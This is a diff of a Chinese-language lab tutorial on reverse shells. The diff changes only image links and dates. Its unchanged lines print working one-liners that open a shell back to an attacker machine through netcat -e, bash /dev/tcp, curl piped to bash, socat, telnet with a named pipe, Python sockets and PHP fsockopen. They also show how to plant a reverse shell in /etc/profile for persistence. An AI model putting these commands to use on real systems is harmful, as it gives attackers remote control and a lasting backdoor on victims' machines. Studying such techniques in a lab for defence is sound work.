@@ -61,33 +61,33 @@ make clean
 > 格式：`nc -lvvp <攻击机监听的端口>`
 
 `netcat -lvvp 23333`
-![image-20230426012933906](https://res.cloudinary.com/sycamore/image/upload/v1792085219/Typora/2023/04/074dea0aeb65e3cf991579314a98284c.png)
+![image-20250615012933906](https://res.cloudinary.com/sycamore/image/upload/v1792696696/Typora/2025/06/074dea0aeb65e3cf991579314a98284c.png)
 
 ### 目标机主动连接攻击机：
 > 格式：`nc <攻击机IP> <攻击机监听的端口> -e /bin/bash`
 
 `netcat 192.168.158.139 23333 -e /bin/bash`
-![image-20230426012929850](https://res.cloudinary.com/sycamore/image/upload/v1792085224/Typora/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png)
+![image-20250615012929850](https://res.cloudinary.com/sycamore/image/upload/v1792696696/Typora/2025/06/f52bbdd3389beb7c7a9e9da72e220e40.png)
 
 （**必须**攻击机**先**开始 **监听**，目标机**再反弹 shell**，这样才会有效果）
 
 成功反弹 shell：
-![image-20230426012926374](https://res.cloudinary.com/sycamore/image/upload/v1792085224/Typora/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png)
+![image-20250615012926374](https://res.cloudinary.com/sycamore/image/upload/v1792696698/Typora/2025/06/9284a9b2e6290d96a8b65313b24f91a3.png)
 
 ## 利用 Bash 反弹 shell
 使用 Bash 中 **网络重定向** 的方法
 ### 准备：
 Kali Linux 中使用的 **Shell** 是 **zsh**，
 可以用命令：`echo %SHELL` 查看当前系统使用的 **Shell**：
-![image-20230426012919215](https://res.cloudinary.com/sycamore/image/upload/v1792085225/Typora/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png)
+![image-20250615012919215](https://res.cloudinary.com/sycamore/image/upload/v1792696699/Typora/2025/06/8d5285fdf9ee6db10ebba4ce645ad92c.png)
 
 所以我们需要更换 Shell：
 - 更换：`chsh -s /bin/bash`
 - 重启：`reboot`
-![image-20230426012915317](https://res.cloudinary.com/sycamore/image/upload/v1792085228/Typora/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png)
+![image-20250615012915317](https://res.cloudinary.com/sycamore/image/upload/v1792696700/Typora/2025/06/a9c9ebe071eae7546dacb18ebc0bb277.png)
 
 **[ 注意 ]：** 出现下图错误只是因为 **攻击机 没开监听**：
-![image-20230426012907770](https://res.cloudinary.com/sycamore/image/upload/v1792085231/Typora/2023/04/8854676b35906672629c5fc26ad8a02f.png)
+![image-20250615012907770](https://res.cloudinary.com/sycamore/image/upload/v1792696700/Typora/2025/06/8854676b35906672629c5fc26ad8a02f.png)
 
 
 另外，Debian 中，部分版本可能默认**没开** bash 的 网络重定向 选项，
@@ -104,10 +104,10 @@ Kali Linux 中使用的 **Shell** 是 **zsh**，
 
 **成功反弹 shell：**
 **目标机** 界面(反弹)：
-![image-20230426012903048](https://res.cloudinary.com/sycamore/image/upload/v1792085231/Typora/2023/04/c693896f2e2fa73809cee178b0f6533b.png)
+![image-20250615012903048](https://res.cloudinary.com/sycamore/image/upload/v1792696702/Typora/2025/06/c693896f2e2fa73809cee178b0f6533b.png)
 
 **攻击机** 界面(监听)： 
-![image-20230426012858851](https://res.cloudinary.com/sycamore/image/upload/v1792085238/Typora/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png)
+![image-20250615012858851](https://res.cloudinary.com/sycamore/image/upload/v1792696703/Typora/2025/06/6fb9f5e48c00f60ba91673a9f6c734eb.png)
 
 
 ### 详细解释：
@@ -137,7 +137,7 @@ Kali Linux 中使用的 **Shell** 是 **zsh**，
 
 开启 **Apache2** 服务之后，会在上述目录下生成一个 `index.php` 文件，
 可以直接删去内容并 **修改**，该文件只是生成一个 **web** 页面而已（如下图）
-![image-20230426012853268](https://res.cloudinary.com/sycamore/image/upload/v1792085234/Typora/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png)
+![image-20250615012853268](https://res.cloudinary.com/sycamore/image/upload/v1792696703/Typora/2025/06/97eb1b3565e6f8745bf100a9b5ee31ed.png)
 
 #### 2. 攻击机打开 23333 端口的监听
 命令：`netcat -lvvp 23333`
@@ -145,10 +145,10 @@ Kali Linux 中使用的 **Shell** 是 **zsh**，
 命令：`curl 192.168.158.139|bash`
 
 实现如图：
-![image-20230426012839981](https://res.cloudinary.com/sycamore/image/upload/v1792085234/Typora/2023/04/66bf859ff6c462a364624b51a215fd64.png)
+![image-20250615012839981](https://res.cloudinary.com/sycamore/image/upload/v1792696704/Typora/2025/06/66bf859ff6c462a364624b51a215fd64.png)
 
 成功反弹 **Shell**：
-![](https://res.cloudinary.com/sycamore/image/upload/v1792085235/Typora/2023/04/01742775f569ce91fa25a5f8f25ed544.png)
+![](https://res.cloudinary.com/sycamore/image/upload/v1792696706/Typora/2025/06/01742775f569ce91fa25a5f8f25ed544.png)
 
 ### Bash 反弹命令写入 /etc/profile 文件
 
@@ -156,27 +156,27 @@ Kali Linux 中使用的 **Shell** 是 **zsh**，
 
 #### 如图：
 > （下图中我输入的是**错误的代码**，所以**启动 Bash** 之后，会**输出报错**内容到命令行）
-> ![image-20230426012821415](https://res.cloudinary.com/sycamore/image/upload/v1792085238/Typora/2023/04/92211d839dd171dc8f115e037f1e07eb.png)
+> ![image-20250615012821415](https://res.cloudinary.com/sycamore/image/upload/v1792696707/Typora/2025/06/92211d839dd171dc8f115e037f1e07eb.png)
 > （如果是**正确的代码**，但是攻击侧**没开监听**，也会报错，如下图：）
-> ![image-20230426012825282](https://res.cloudinary.com/sycamore/image/upload/v1792085238/Typora/2023/04/566b0ca11a943f96d0bf550e848d84d4.png)
+> ![image-20250615012825282](https://res.cloudinary.com/sycamore/image/upload/v1792696708/Typora/2025/06/566b0ca11a943f96d0bf550e848d84d4.png)
 
 #### 布置的步骤：
  通过 `vim /etc/profile`，编辑文件：
-![image-20230426012816962](https://res.cloudinary.com/sycamore/image/upload/v1792085238/Typora/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png)
+![image-20250615012816962](https://res.cloudinary.com/sycamore/image/upload/v1792696709/Typora/2025/06/6a8db3c08c0188c7b0a9b1d25fed3c50.png)
 
 
 - 在末尾添加代码：`/bin/bash -i >& /dev/tcp/192.168.158.139/23333 0>&1 &`
 > 该命令比直接反弹的代码在 **末尾** 多了一个 **&**，
 > 这是为了让打开 **Bash** 的用户能正常使用
 
-![image-20230426012812596](https://res.cloudinary.com/sycamore/image/upload/v1792085246/Typora/2023/04/bf591833811a31c67bcfb2741ab7ca30.png)
+![image-20250615012812596](https://res.cloudinary.com/sycamore/image/upload/v1792696712/Typora/2025/06/bf591833811a31c67bcfb2741ab7ca30.png)
 
 **演示：**
 - 攻击机开始监听 23333 端口
 - **Xshell** 打开目标机的会话（即**启动了 Bash**）
-![image-20230426012807425](https://res.cloudinary.com/sycamore/image/upload/v1792085246/Typora/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png)
+![image-20250615012807425](https://res.cloudinary.com/sycamore/image/upload/v1792696712/Typora/2025/06/1fe57f518c02b5c5651dc8fbfe3269c7.png)
 - 没有回显，且攻击机**成功 getshell**，**反弹成功**
-![image-20230426012804072](https://res.cloudinary.com/sycamore/image/upload/v1792085247/Typora/2023/04/5d329939a4e8d82c53c712f4b54adb09.png)
+![image-20250615012804072](https://res.cloudinary.com/sycamore/image/upload/v1792696713/Typora/2025/06/5d329939a4e8d82c53c712f4b54adb09.png)
 ## 利用 Socat 反弹 Shell
 **Socat** 是 **Linux** 下一个多功能的网络工具，功能与 **netcat (nc)** 类似。
 所以我们也可以使用 **Socat**，开监听、反弹 **Shell**
@@ -187,14 +187,14 @@ Kali Linux 中使用的 **Shell** 是 **zsh**，
 
 ### 攻击机开启监听
 命令：`socat TCP-LISTEN:23333 -`
-![image-20230426012759404](https://res.cloudinary.com/sycamore/image/upload/v1792085254/Typora/2023/04/f6ffc230be89565c17383bbe1e8262a3.png)
+![image-20250615012759404](https://res.cloudinary.com/sycamore/image/upload/v1792696714/Typora/2025/06/f6ffc230be89565c17383bbe1e8262a3.png)
 
 ### 目标机通过 Socat 建立连接
 命令：`socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane`
-![image-20230426012754642](https://res.cloudinary.com/sycamore/image/upload/v1792085255/Typora/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png)
+![image-20250615012754642](https://res.cloudinary.com/sycamore/image/upload/v1792696716/Typora/2025/06/00614ff7b3a1a2dfdfbad02dc0df8be1.png)
 
 **成功** 反弹 **Shell**：
-![image-20230426012750258](https://res.cloudinary.com/sycamore/image/upload/v1792085255/Typora/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png)
+![image-20250615012750258](https://res.cloudinary.com/sycamore/image/upload/v1792696723/Typora/2025/06/7b31e1aa07c5c4bdcbd9e6cafad1655a.png)
 
 ## 利用 Telnet 反弹 Shell
 我们总会遇到，目标机 **Netcat** 和 `/dev/tcp/` 方法不可用的情况，
@@ -204,9 +204,9 @@ Kali Linux 中使用的 **Shell** 是 **zsh**，
 （用 **nc** 或者 **socat** 都行）
 - 目标机执行命令，建立连接：
 `mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a`
-![image-20230426012739427](https://res.cloudinary.com/sycamore/image/upload/v1792085257/Typora/2023/04/db443fe2827a018ce3cb046f63793326.png)
+![image-20250615012739427](https://res.cloudinary.com/sycamore/image/upload/v1792696717/Typora/2025/06/db443fe2827a018ce3cb046f63793326.png)
 - 成功获得 **反弹 Shell**：
-![image-20230426012732507](https://res.cloudinary.com/sycamore/image/upload/v1792085258/Typora/2023/04/d3d507d38eb37d836868b42d5f90db17.png)
+![image-20250615012732507](https://res.cloudinary.com/sycamore/image/upload/v1792696722/Typora/2025/06/d3d507d38eb37d836868b42d5f90db17.png)
 ## 用 Python 脚本反弹 Shell
 使用 **Python** 的 **socket** 库
 
@@ -217,9 +217,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 （或者也可以转化成 .py 的 Python 文件，然后命令行执行）
 
 如下图所示：
-![image-20230426012727025](https://res.cloudinary.com/sycamore/image/upload/v1792085258/Typora/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png)
+![image-20250615012727025](https://res.cloudinary.com/sycamore/image/upload/v1792696722/Typora/2025/06/ff1cae7c81c0b04929f2c86b0e788c9e.png)
 成功反弹 **Shell**
-![image-20230426012721830](https://res.cloudinary.com/sycamore/image/upload/v1792085261/Typora/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png)
+![image-20250615012721830](https://res.cloudinary.com/sycamore/image/upload/v1792696724/Typora/2025/06/6826b2f0cec7b82a3677a2e1e86de378.png)
 
 ## 用 php 脚本反弹 Shell
 攻击侧开启监听，目标机执行的 php 脚本如下：
@@ -227,8 +227,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 php -r '$sock=fsockopen("192.168.158.139",23333);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 实现如下：
-![image-20230426012715771](https://res.cloudinary.com/sycamore/image/upload/v1792085262/Typora/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png)
-![image-20230426012702683](https://res.cloudinary.com/sycamore/image/upload/v1792085268/Typora/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png)
+![image-20250615012715771](https://res.cloudinary.com/sycamore/image/upload/v1792696729/Typora/2025/06/fdd3929e8cec1fc5e67af1614f47d9b4.png)
+![image-20250615012702683](https://res.cloudinary.com/sycamore/image/upload/v1792696730/Typora/2025/06/c830f507fd2cc729beb4e10b7a5d18cd.png)
 
 ## 最后
 逐一实现了这么多的 **反弹 Shell** 的方法，我发现他们本质上都是一致的。
